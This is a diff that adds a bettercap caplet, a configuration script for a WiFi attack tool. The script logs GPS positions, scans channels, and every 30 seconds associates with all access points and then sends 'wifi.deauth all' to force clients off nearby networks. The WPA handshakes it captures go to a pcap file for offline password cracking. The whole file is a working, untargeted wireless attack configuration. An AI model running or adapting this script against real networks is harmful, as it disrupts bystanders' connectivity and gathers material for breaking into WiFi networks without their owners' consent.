@@ -1,0 +1,17 @@
+#### SET ################################################################
+set gps.device localhost:2947
+set wifi.handshakes.file /sd/LEET/handshakes/PW-NA-GO-TC-HI-00_full.pcap
+set wifi.recon.channel clear 
+set wifi.hop.period 300
+set wifi.region BR
+set wifi.assoc.skip MA:NA:GE:ME:NT:AP
+set wifi.deauth.skip MA:NA:GE:ME:NT:AP
+set ticker.period 30
+set ticker.commands clear; wifi.assoc all; sleep 10; wifi.deauth all
+#### RUN ################################################################
+gps on
+wifi.recon on
+ticker on
+events.ignore wifi.client.probe
+events.clear
+events.stream off
